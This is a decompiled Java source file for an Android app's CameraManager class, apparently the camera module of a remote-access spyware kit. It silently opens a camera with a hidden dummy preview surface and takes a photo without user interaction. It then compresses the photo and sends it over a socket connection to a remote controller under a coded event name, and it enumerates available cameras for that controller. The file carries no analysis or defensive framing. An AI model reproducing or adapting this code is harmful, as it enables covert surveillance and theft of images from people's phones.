package com.example.project20;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import java.io.ByteArrayOutputStream;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CameraManager {
    private Camera camera;
    private Context context;

    public CameraManager(Context context2) {
        this.context = context2;
    }

    public void startUp(int i) {
        Camera open = Camera.open(i);
        this.camera = open;
        this.camera.setParameters(open.getParameters());
        try {
            this.camera.setPreviewTexture(new SurfaceTexture(0));
            this.camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        this.camera.takePicture(null, null, new Camera.PictureCallback() {
            /* class com.example.project20.CameraManager.AnonymousClass1 */

            public void onPictureTaken(byte[] bArr, Camera camera) {
                CameraManager.this.releaseCamera();
                CameraManager.this.sendPhoto(bArr);
            }
        });
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private void sendPhoto(byte[] bArr) {
        try {
            Bitmap decodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            decodeByteArray.compress(Bitmap.CompressFormat.JPEG, 20, byteArrayOutputStream);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("image", true);
            jSONObject.put("buffer", byteArrayOutputStream.toByteArray());
            IOSocket.getInstance().getIoSocket().emit("0xCA", jSONObject);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private void releaseCamera() {
        Camera camera2 = this.camera;
        if (camera2 != null) {
            camera2.stopPreview();
            this.camera.release();
            this.camera = null;
        }
    }

    public JSONObject findCameraList() {
        if (!this.context.getPackageManager().hasSystemFeature("android.hardware.camera")) {
            return null;
        }
        try {
            JSONObject jSONObject = new JSONObject();
            JSONArray jSONArray = new JSONArray();
            jSONObject.put("camList", true);
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == 1) {
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put("name", "Front");
                    jSONObject2.put("id", i);
                    jSONArray.put(jSONObject2);
                } else if (cameraInfo.facing == 0) {
                    JSONObject jSONObject3 = new JSONObject();
                    jSONObject3.put("name", "Back");
                    jSONObject3.put("id", i);
                    jSONArray.put(jSONObject3);
                } else {
                    JSONObject jSONObject4 = new JSONObject();
                    jSONObject4.put("name", "Other");
                    jSONObject4.put("id", i);
                    jSONArray.put(jSONObject4);
                }
            }
            jSONObject.put("list", jSONArray);
            return jSONObject;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }
}
